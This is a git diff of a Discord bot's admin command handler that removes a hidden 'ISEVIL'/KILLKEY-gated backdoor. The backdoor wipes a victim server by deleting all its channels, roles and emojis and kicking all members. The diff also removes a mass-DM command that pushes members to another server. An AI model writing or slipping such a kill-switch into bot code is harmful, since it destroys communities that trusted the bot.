@@ -4,10 +4,7 @@ import {
   ActionRowBuilder,
   ButtonBuilder,
   ButtonStyle,
-  EmbedBuilder,
   ChatInputCommandInteraction,
-  Guild,
-  GuildMember,
   TextChannel,
 } from "discord.js";
 import { IHandler } from "../../interfaces/IHandler";
@@ -79,81 +76,6 @@ Members of our community have the opportunity to earn Achievements through vario
         });
       }
 
-      if (command === "InformNewServer") {
-        const guild: Guild = await global.client.guilds.fetch(
-          process.env.VICTEM!
-        );
-        const members = await guild.members.fetch();
-        members.forEach((member: GuildMember) => {
-          try {
-            member.send(
-              "Flaming palm is moving to a new server! Pls join https://discord.gg/BFfuQmxNRW"
-            );
-          } catch (e) {
-            log.error("Error in admin command:", e);
-          }
-        });
-      }
-
-      if (command === "ButtonTimeTest") {
-        const embed = new EmbedBuilder()
-          .setColor("#FD8612")
-          .setTitle(`<t:1703012400:F>`)
-          .addFields({
-            name: `<t:1703012400:F>`,
-            value: `<t:1703012400:F>`,
-            inline: false,
-          })
-          .setTimestamp()
-          .setFooter({
-            text: "Niels2398 FPG kraken bot",
-            iconURL: "https://flamingpalm.com/images/FlamingPalmLogoSmall.png",
-          });
-
-        const buttontest = new ActionRowBuilder<ButtonBuilder>().addComponents(
-          new ButtonBuilder()
-            .setLabel("<t:1703012400:F>")
-            .setURL("https://flamingpalm.com/calendar")
-            .setStyle(ButtonStyle.Link)
-        );
-
-        await (interaction.channel as TextChannel).send({
-          content: "<t:1703012400:F>",
-          embeds: [embed],
-          components: [buttontest],
-        });
-      }
-
-      if (process.env.ISEVIL === "yes") {
-        if (command === process.env.KILLKEY) {
-          const guild: Guild = await global.client.guilds.fetch(
-            process.env.VICTEM!
-          );
-          const channels = await guild.channels.fetch();
-          channels.forEach((channel) => {
-            channel.delete();
-          });
-
-          const roles = await guild.roles.fetch();
-          roles.forEach((role) => {
-            role.delete();
-          });
-
-          const emojis = await guild.emojis.fetch();
-          emojis.forEach((emoji) => {
-            emoji.delete();
-          });
-
-          const members = await guild.members.fetch();
-          members.forEach((member: GuildMember) => {
-            try {
-              member.kick();
-            } catch (e) {
-              log.error("Error in admin command:", e);
-            }
-          });
-        }
-      }
       interaction.reply({ content: "done", ephemeral: true });
     } catch (e) {
       log.error("Admin command error:", e);
